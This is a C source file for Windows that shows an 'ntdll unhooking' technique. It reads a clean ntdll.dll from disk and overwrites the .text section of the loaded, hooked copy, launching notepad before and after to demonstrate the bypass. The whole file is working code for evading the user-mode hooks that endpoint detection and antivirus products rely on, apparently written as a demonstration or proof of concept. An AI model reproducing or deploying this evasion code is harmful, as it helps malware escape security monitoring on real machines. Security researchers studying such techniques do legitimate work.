#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

int main(void)
{
    HMODULE hOldNtdll = NULL;
    MODULEINFO info = {};
    LPVOID lpBaseAddress = NULL;
    HANDLE hNewNtdll = NULL;
    HANDLE hFileMapping = NULL;
    LPVOID lpFileData = NULL;
    PIMAGE_DOS_HEADER pDosHeader = NULL;
    PIMAGE_NT_HEADERS64 pNtHeader = NULL;

    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    printf("Press a key after the DLL injection\n");
    getchar();

    printf("Opening new notepad process before ntdll unhooking.\n");
    if (CreateProcessA(
        NULL,
        "notepad.exe",
        NULL, NULL, FALSE,
        0, NULL, NULL,
        &si,
        &pi))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    printf("Performing ntdll unhooking\n");

    /* 
    in order to bypass the hooking, we need to load in memory a clean, unhooked copy of ntdll from disk.
    then, we overwrite the instructions of the hooked NTDLL (.text section) with the instructions of the clean ntdll we just loaded into memory
    */

    // load the clean ntdll into memory using a memory file mapping
    hNewNtdll = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    hFileMapping = CreateFileMappingA(hNewNtdll, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    lpFileData = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);


    // find the base address of the hooked, currently loaded ntdll
    hOldNtdll = GetModuleHandleA("ntdll.dll");
    if (GetModuleInformation(GetCurrentProcess(), hOldNtdll, &info, sizeof(MODULEINFO))) {
        lpBaseAddress = info.lpBaseOfDll;
    }

    // parse the hooked, currently loaded ntdll header to find the .text section. then, overwrite it with the .text of the clean ntdll
    pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddress;  // DOS header
    pNtHeader = (PIMAGE_NT_HEADERS64)((ULONG_PTR)lpBaseAddress + pDosHeader->e_lfanew); // NT header

    PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(pNtHeader);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = pFirstSection + i;
        if (!strcmp((PCHAR)pSection->Name, ".text")) {  // iterate over each section until .text is found
            DWORD oldProtection = 0;
            VirtualProtect((LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress), pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);  // make hooked ntdll .text section writable
            memcpy((LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress), (LPVOID)((ULONG_PTR)lpFileData + pSection->VirtualAddress), pSection->Misc.VirtualSize);  // copy clean ntdll's .text in place of the currently loaded (hooked) .text
            VirtualProtect((LPVOID)((ULONG_PTR)lpBaseAddress + pSection->VirtualAddress), pSection->Misc.VirtualSize, oldProtection, &oldProtection);  // revert memory perms
            break;
        }
    }

    printf("Opening new notepad process after ntdll unhooking.\n");

    // CreateProcessA under the hood calls ntdll's NtCreateUserProcess, but should be unhooked!
    if (CreateProcessA(
        NULL,
        "notepad.exe",
        NULL, NULL, FALSE,
        0, NULL, NULL,
        &si,
        &pi))
    {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    Sleep(2000);

    return 0;
}
